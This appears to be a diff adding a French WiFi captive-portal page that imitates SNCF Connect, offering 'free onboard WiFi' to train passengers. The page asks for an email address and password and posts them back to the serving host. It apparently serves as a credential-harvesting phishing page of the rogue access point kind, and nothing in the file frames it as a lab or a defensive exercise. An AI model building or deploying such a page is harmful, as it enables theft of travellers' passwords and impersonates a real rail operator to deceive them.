@@ -1,0 +1,476 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SNCF Connect WiFi Gratuit</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Arial', 'Helvetica Neue', sans-serif;
+            background: linear-gradient(135deg, #0088CE 0%, #FFFFFF 25%, #E73C7E 50%, #003366 75%, #0088CE 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+            padding: 2rem 0;
+        }
+
+        body::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-image: 
+                radial-gradient(circle at 30% 30%, rgba(0, 136, 206, 0.15) 0%, transparent 50%),
+                radial-gradient(circle at 70% 70%, rgba(231, 60, 126, 0.15) 0%, transparent 50%);
+            animation: trainMove 20s linear infinite;
+        }
+
+        @keyframes trainMove {
+            0% { transform: translateX(-100px) translateY(0px); }
+            25% { transform: translateX(100px) translateY(-20px); }
+            50% { transform: translateX(0px) translateY(20px); }
+            75% { transform: translateX(-50px) translateY(-10px); }
+            100% { transform: translateX(-100px) translateY(0px); }
+        }
+
+        .container {
+            background: linear-gradient(145deg, #ffffff 0%, #f8fbff 100%);
+            border-radius: 24px;
+            padding: 2.5rem;
+            box-shadow: 0 30px 80px rgba(0, 136, 206, 0.25);
+            width: 100%;
+            max-width: 420px;
+            position: relative;
+            animation: slideIn 0.8s cubic-bezier(0.4, 0, 0.2, 1);
+            border: 3px solid transparent;
+            background-clip: padding-box;
+        }
+
+        .container::before {
+            content: '';
+            position: absolute;
+            top: -3px;
+            left: -3px;
+            right: -3px;
+            bottom: -3px;
+            background: linear-gradient(45deg, #0088CE, #E73C7E, #003366);
+            border-radius: 24px;
+            z-index: -1;
+            animation: borderTrain 3s ease-in-out infinite;
+        }
+
+        @keyframes borderTrain {
+            0%, 100% { opacity: 0.7; }
+            50% { opacity: 1; }
+        }
+
+        @keyframes slideIn {
+            from {
+                opacity: 0;
+                transform: translateX(-100px) scale(0.9);
+            }
+            to {
+                opacity: 1;
+                transform: translateX(0) scale(1);
+            }
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 2rem;
+        }
+
+        .logo {
+            width: 130px;
+            height: 130px;
+            background: linear-gradient(45deg, #0088CE 0%, #E73C7E 50%, #003366 100%);
+            border-radius: 20px;
+            margin: 0 auto 1.5rem;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+            box-shadow: 0 20px 50px rgba(0, 136, 206, 0.35);
+            animation: logoTrain 3s ease-in-out infinite;
+            border: 4px solid #ffffff;
+        }
+
+        @keyframes logoTrain {
+            0%, 100% { 
+                transform: translateX(0px) rotateY(0deg); 
+            }
+            50% { 
+                transform: translateX(10px) rotateY(10deg) scale(1.05); 
+            }
+        }
+
+        .logo::before {
+            content: '🚄';
+            font-size: 4rem;
+            filter: drop-shadow(2px 2px 4px rgba(0, 0, 0, 0.3));
+            animation: trainBob 2s ease-in-out infinite;
+        }
+
+        @keyframes trainBob {
+            0%, 100% { transform: translateX(0px); }
+            50% { transform: translateX(5px); }
+        }
+
+        .logo::after {
+            content: '';
+            position: absolute;
+            top: -8px;
+            right: -8px;
+            width: 34px;
+            height: 34px;
+            background: linear-gradient(45deg, #E73C7E, #0088CE);
+            border-radius: 50%;
+            border: 3px solid #FFFFFF;
+            animation: signalPulse 1.5s ease-in-out infinite;
+        }
+
+        @keyframes signalPulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.3); }
+        }
+
+        .brand-name {
+            background: linear-gradient(45deg, #0088CE, #E73C7E, #003366);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            font-size: 2.2rem;
+            font-weight: 700;
+            margin-bottom: 0.3rem;
+            text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.1);
+            letter-spacing: -1px;
+            font-family: 'Arial', sans-serif;
+        }
+
+        .brand-subtitle {
+            color: #0088CE;
+            font-size: 1rem;
+            font-weight: 600;
+            margin-bottom: 0.8rem;
+            font-style: italic;
+        }
+
+        .wifi-title {
+            color: #333;
+            font-size: 1.3rem;
+            font-weight: 600;
+            margin-bottom: 1rem;
+        }
+
+        .wifi-info {
+            background: linear-gradient(90deg, #0088CE, #E73C7E);
+            color: #FFFFFF;
+            padding: 1rem 1.8rem;
+            border-radius: 25px;
+            font-size: 1rem;
+            font-weight: 700;
+            display: inline-block;
+            animation: sncfGlow 2s ease-in-out infinite alternate;
+            border: 3px solid #FFFFFF;
+            box-shadow: 0 8px 20px rgba(0, 136, 206, 0.3);
+            text-transform: uppercase;
+            letter-spacing: 0.8px;
+        }
+
+        @keyframes sncfGlow {
+            from { 
+                box-shadow: 0 8px 20px rgba(0, 136, 206, 0.3);
+                transform: scale(1);
+            }
+            to { 
+                box-shadow: 0 12px 30px rgba(231, 60, 126, 0.4);
+                transform: scale(1.03);
+            }
+        }
+
+        .welcome-text {
+            text-align: center;
+            color: #333;
+            font-size: 1rem;
+            margin-bottom: 2rem;
+            line-height: 1.6;
+            background: linear-gradient(135deg, #f8fbff, #ffffff);
+            padding: 1.5rem;
+            border-radius: 15px;
+            border-left: 4px solid #0088CE;
+            border-right: 4px solid #E73C7E;
+            font-weight: 500;
+        }
+
+        .form-group {
+            margin-bottom: 1.5rem;
+            position: relative;
+        }
+
+        label {
+            display: block;
+            color: #333;
+            font-weight: 600;
+            margin-bottom: 0.8rem;
+            font-size: 0.95rem;
+        }
+
+        input[type="email"],
+        input[type="password"] {
+            width: 100%;
+            padding: 1.2rem 1.5rem;
+            border: 2px solid #E0E0E0;
+            border-radius: 12px;
+            font-size: 1rem;
+            transition: all 0.3s ease;
+            background: #F8FBFF;
+            outline: none;
+            font-weight: 500;
+        }
+
+        input[type="email"]:focus,
+        input[type="password"]:focus {
+            border-color: #0088CE;
+            background: white;
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(0, 136, 206, 0.25);
+        }
+
+        .connect-btn {
+            width: 100%;
+            padding: 1.3rem;
+            background: linear-gradient(135deg, #0088CE 0%, #E73C7E 100%);
+            color: white;
+            border: none;
+            border-radius: 12px;
+            font-size: 1.2rem;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-bottom: 1.5rem;
+            font-family: 'Arial', sans-serif;
+        }
+
+        .connect-btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.3), transparent);
+            transition: left 0.5s;
+        }
+
+        .connect-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 15px 35px rgba(0, 136, 206, 0.4);
+            background: linear-gradient(135deg, #0077B8 0%, #D6356E 100%);
+        }
+
+        .connect-btn:hover::before {
+            left: 100%;
+        }
+
+        .footer-info {
+            text-align: center;
+            color: #666;
+            font-size: 0.85rem;
+            line-height: 1.5;
+            margin-top: 1rem;
+            background: rgba(248, 251, 255, 0.8);
+            padding: 1rem;
+            border-radius: 12px;
+            font-weight: 500;
+        }
+
+        .terms-link {
+            color: #0088CE;
+            text-decoration: none;
+            font-weight: 600;
+        }
+
+        .terms-link:hover {
+            text-decoration: underline;
+            color: #E73C7E;
+        }
+
+        .wifi-status {
+            position: absolute;
+            top: 18px;
+            right: 18px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            background: linear-gradient(135deg, rgba(255, 255, 255, 0.95), rgba(248, 251, 255, 0.95));
+            padding: 0.6rem 1.2rem;
+            border-radius: 20px;
+            font-size: 0.8rem;
+            font-weight: 600;
+            color: #0088CE;
+            border: 2px solid rgba(0, 136, 206, 0.2);
+        }
+
+        .signal-bars {
+            display: flex;
+            gap: 2px;
+        }
+
+        .bar {
+            width: 4px;
+            border-radius: 2px;
+            animation: sncfSignal 1.4s ease-in-out infinite;
+        }
+
+        .bar:nth-child(1) { height: 8px; background: #0088CE; animation-delay: 0s; }
+        .bar:nth-child(2) { height: 12px; background: #0088CE; animation-delay: 0.2s; }
+        .bar:nth-child(3) { height: 16px; background: #E73C7E; animation-delay: 0.4s; }
+        .bar:nth-child(4) { height: 20px; background: #E73C7E; animation-delay: 0.6s; }
+
+        @keyframes sncfSignal {
+            0%, 100% { opacity: 0.3; }
+            50% { opacity: 1; }
+        }
+
+        .promo-banner {
+            background: linear-gradient(90deg, #0088CE, #E73C7E, #003366);
+            color: white;
+            padding: 1rem;
+            margin-bottom: 1.5rem;
+            border-radius: 15px;
+            text-align: center;
+            font-weight: 700;
+            font-size: 0.9rem;
+            animation: sncfPulse 2s ease-in-out infinite;
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            text-transform: uppercase;
+            letter-spacing: 0.8px;
+        }
+
+        @keyframes sncfPulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.02); }
+        }
+
+        .loading {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255,255,255,.3);
+            border-radius: 50%;
+            border-top-color: #fff;
+            animation: spin 1s ease-in-out infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        @media (max-width: 480px) {
+            .container {
+                margin: 1rem;
+                padding: 2rem;
+            }
+            
+            .logo {
+                width: 110px;
+                height: 110px;
+            }
+            
+            .logo::before {
+                font-size: 3rem;
+            }
+            
+            .brand-name {
+                font-size: 1.8rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="wifi-status">
+            <div class="signal-bars">
+                <div class="bar"></div>
+                <div class="bar"></div>
+                <div class="bar"></div>
+                <div class="bar"></div>
+            </div>
+            WiFi SNCF
+        </div>
+
+        <div class="header">
+            <div class="logo"></div>
+            <h1 class="brand-name">SNCF Connect</h1>
+            <p class="brand-subtitle">Voyagez connecté</p>
+            <p class="wifi-title">WiFi Gratuit</p>
+            <div class="wifi-info">Connexion Express</div>
+        </div>
+
+        <div class="promo-banner">
+            🚄 Réservez vos billets sur SNCF Connect !
+        </div>
+
+        <div class="welcome-text">
+            <strong>Bienvenue à bord !</strong><br>
+            Connectez-vous à notre WiFi gratuit et voyagez en toute sérénité avec SNCF Connect.
+        </div>
+
+        <form id="wifiForm" action="/" method="post">
+            <div class="form-group">
+                <label for="email">Adresse e-mail</label>
+                <input type="email" id="email" name="email" required placeholder="votre@email.com">
+            </div>
+
+            <div class="form-group">
+                <label for="password">Mot de passe</label>
+                <input type="password" id="password" name="password" required placeholder="Votre mot de passe">
+            </div>
+
+            <button type="submit" class="connect-btn" id="connectBtn">
+                🌐 Se connecter
+            </button>
+        </form>
+
+        <div class="footer-info">
+            En vous connectant, vous acceptez nos <a href="#" class="terms-link">conditions d'utilisation</a>.<br>
+            <strong>SNCF Connect</strong> • Connexion sécurisée SSL<br>
+            Bon voyage et bonne navigation !
+        </div>
+    </div>
+
+    <script>
+        document.querySelectorAll('input').forEach(input => {
+            input.addEventListener('focus', function() {
+                this.parentElement.style.transform = 'scale(1.01)';
+                this.parentElement.style.transition = 'transform 0.3s ease';
+            });
+            
+            input.addEventListener('blur', function() {
+                this.parentElement.style.transform = 'scale(1)';
+            });
+        });
+
+        document.getElementById('wifiForm').addEventListener('submit', function(e) {
+            const btn = document.getElementById('connectBtn');
+            btn.innerHTML = '<div class="loading"></div> Connexion en cours...';
+            btn.disabled = true;
+            btn.style.background = 'linear-gradient(135deg, #0077B8, #D6356E)';
+        });
+    </script>
+</body>
+</html>
